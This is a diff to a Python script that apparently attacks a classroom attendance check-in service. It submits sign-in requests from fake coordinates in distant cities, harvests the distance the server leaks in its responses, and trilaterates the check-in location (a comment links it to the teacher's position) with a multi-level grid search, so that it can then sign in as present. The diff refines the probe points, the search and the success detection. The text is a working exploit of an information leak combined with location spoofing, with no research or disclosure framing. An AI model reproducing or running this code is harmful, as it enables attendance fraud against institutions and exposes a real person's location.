@@ -178,7 +178,7 @@ def try_sign(lat, lng, address="中国"):
                        "appType": "15", "fid": "0", "address": address},
                  headers=AJAX_HDR, timeout=15)
     text = r.text
-    if "成功" in text:
+    if "成功" in text or re.search(r'("success"|^success$|\bsuccess\b)', text, re.I):
         return 0, True, text
     if "已签到" in text or "已经签到" in text:
         return -2, False, text
@@ -191,11 +191,11 @@ def try_sign(lat, lng, address="中国"):
 
 
 print("\n[Phase 5] 验证距离信息泄露 — 用远离的坐标试探...")
-# 起始探测点：郑州（之前教师位置附近）+ 北京（远离点）
+# 起始探测点：三个相距较远的城市（避免直接签到成功，先收集测距样本）
 probes = [
-    ("郑州", 34.79, 113.67),
     ("北京", 39.90, 116.40),
     ("上海", 31.23, 121.47),
+    ("广州", 23.13, 113.26),
 ]
 measurements = []
 for pname, lat, lng in probes:
@@ -225,27 +225,27 @@ if not best_pos and len(measurements) >= 3:
         a = math.sin(dphi / 2) ** 2 + math.cos(phi1) * math.cos(phi2) * math.sin(dlambda / 2) ** 2
         return 2 * R * math.asin(math.sqrt(a))
 
-    # 以距离最小的测点为中心网格搜索
-    c_lat = min(measurements, key=lambda m: m[2])[0]
-    c_lng = min(measurements, key=lambda m: m[2])[1]
+    # 分级网格细化搜索：从测点质心出发，逐级缩小范围（避免大范围网格爆炸）
+    c_lat = sum(m[0] for m in measurements) / len(measurements)
+    c_lng = sum(m[1] for m in measurements) / len(measurements)
     max_d = max(m[2] for m in measurements)
 
     best_err, best_lat, best_lng = float('inf'), c_lat, c_lng
-    # 粗搜（约max_d公里范围）
-    rng = max(0.05, max_d / 111000.0 + 0.05)
-    step = 0.002
-    for la in [c_lat - rng + i * step for i in range(int(2 * rng / step) + 1)]:
-        for lo in [c_lng - rng + i * step for i in range(int(2 * rng / step) + 1)]:
-            err = sum((haversine(m[0], m[1], la, lo) - m[2]) ** 2 for m in measurements)
-            if err < best_err:
-                best_err, best_lat, best_lng = err, la, lo
-    # 精搜
-    step2 = 0.0002
-    for la in [best_lat - 0.002 + i * step2 for i in range(21)]:
-        for lo in [best_lng - 0.002 + i * step2 for i in range(21)]:
-            err = sum((haversine(m[0], m[1], la, lo) - m[2]) ** 2 for m in measurements)
-            if err < best_err:
-                best_err, best_lat, best_lng = err, la, lo
+    # 第0级：覆盖最大距离对应范围
+    rng = max(0.5, max_d / 111000.0)
+    step = max(0.01, rng / 30)
+    for level in range(5):
+        n = max(3, int(2 * rng / step))
+        for la in [best_lat - rng + i * step for i in range(n + 1)]:
+            for lo in [best_lng - rng + i * step for i in range(n + 1)]:
+                err = sum((haversine(m[0], m[1], la, lo) - m[2]) ** 2 for m in measurements)
+                if err < best_err:
+                    best_err, best_lat, best_lng = err, la, lo
+        print(f"  级别{level}: 最佳({best_lat:.6f},{best_lng:.6f}), RMS={math.sqrt(best_err/len(measurements)):.0f}m, rng={rng:.4f}, step={step:.5f}")
+        rng = step * 2  # 下一级只搜当前最佳点附近
+        step = step / 10
+        if step < 0.00005:
+            break
     best_pos = (best_lat, best_lng)
     print(f"  三角定位结果: ({best_lat:.6f}, {best_lng:.6f}), RMS误差={math.sqrt(best_err/len(measurements)):.0f}m")
 elif not best_pos:
